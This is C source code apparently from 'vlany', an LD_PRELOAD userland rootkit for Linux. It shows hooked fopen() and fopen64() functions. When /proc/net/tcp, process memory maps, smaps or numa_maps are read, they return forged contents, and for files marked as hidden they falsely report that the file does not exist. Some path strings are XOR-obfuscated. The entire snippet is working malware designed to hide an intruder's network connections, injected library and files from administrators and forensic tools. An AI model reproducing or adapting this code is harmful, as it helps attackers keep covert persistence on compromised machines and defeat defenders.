FILE *fopen(const char *path, const char *mode)
{
    #ifdef DEBUG
        printf("[vlany] fopen() called\n");
    #endif

    HOOK(old_fopen, CFOPEN);

    if(owned()) return old_fopen(path, mode);

    char *proc_net_tcp = strdup(PROC_NET_TCP), *proc_net_tcp6 = strdup(PROC_NET_TCP6);
    xor(proc_net_tcp); xor(proc_net_tcp6);
    if(!strcmp(path, proc_net_tcp) || !strcmp(path, proc_net_tcp6)) { CLEAN(proc_net_tcp); CLEAN(proc_net_tcp6); return forge_proc_net_tcp(path); }
    CLEAN(proc_net_tcp); CLEAN(proc_net_tcp6);

    // piss off
    if(!fnmatch("/proc/*/maps", path, FNM_PATHNAME)) return forge_mem_maps(path);
    if(!fnmatch("/proc/*/smaps", path, FNM_PATHNAME)) return forge_mem_smaps(path);

    if(!fnmatch("/proc/*/numa_maps", path, FNM_PATHNAME)) return forge_numa_maps(path); // don't talk to me or my sons ever again

    // if cwd is /proc/ or /proc/id
    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL)
    {
        if(!strcmp(cwd, "/proc"))
        {
            if(!fnmatch("*/maps", path, FNM_PATHNAME)) return forge_mem_maps(path);
            if(!fnmatch("*/smaps", path, FNM_PATHNAME)) return forge_mem_smaps(path);

            if(!fnmatch("*/numa_maps", path, FNM_PATHNAME)) return forge_numa_maps(path);
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME))
        {
            if(!fnmatch("maps", path, FNM_PATHNAME)) return forge_mem_maps(path);
            if(!fnmatch("smaps", path, FNM_PATHNAME)) return forge_mem_smaps(path);

            if(!fnmatch("numa_maps", path, FNM_PATHNAME)) return forge_numa_maps(path);
        }
    }

    if(hidden_xattr(path) || hidden_xstat(_STAT_VER, path, 32)) { errno = ENOENT; return NULL; }

    return old_fopen(path, mode);
}

FILE *fopen64(const char *path, const char *mode)
{
    #ifdef DEBUG
        printf("[vlany] fopen64() called\n");
    #endif

    HOOK(old_fopen64, CFOPEN64);

    if(owned()) return old_fopen64(path, mode);

    char *proc_net_tcp = strdup(PROC_NET_TCP), *proc_net_tcp6 = strdup(PROC_NET_TCP6);
    xor(proc_net_tcp); xor(proc_net_tcp6);
    if(!strcmp(path, proc_net_tcp) || !strcmp(path, proc_net_tcp6)) { CLEAN(proc_net_tcp); CLEAN(proc_net_tcp6); return forge_proc_net_tcp(path); }
    CLEAN(proc_net_tcp); CLEAN(proc_net_tcp6);

    if(!fnmatch("/proc/*/maps", path, FNM_PATHNAME)) return forge_mem_maps(path);
    if(!fnmatch("/proc/*/smaps", path, FNM_PATHNAME)) return forge_mem_smaps(path);

    if(!fnmatch("/proc/*/numa_maps", path, FNM_PATHNAME)) return forge_numa_maps(path);

    // if cwd is /proc/ or /proc/id
    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL)
    {
        if(!strcmp(cwd, "/proc"))
        {
            if(!fnmatch("*/maps", path, FNM_PATHNAME)) return forge_mem_maps(path);
            if(!fnmatch("*/smaps", path, FNM_PATHNAME)) return forge_mem_smaps(path);

            if(!fnmatch("*/numa_maps", path, FNM_PATHNAME)) return forge_numa_maps(path);
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME))
        {
            if(!fnmatch("maps", path, FNM_PATHNAME)) return forge_mem_maps(path);
            if(!fnmatch("smaps", path, FNM_PATHNAME)) return forge_mem_smaps(path);

            if(!fnmatch("numa_maps", path, FNM_PATHNAME)) return forge_numa_maps(path);
        }
    }

    if(hidden_xattr(path) || hidden_xstat(_STAT_VER, path, 64)) { errno = ENOENT; return NULL; }

    return old_fopen64(path, mode);
}
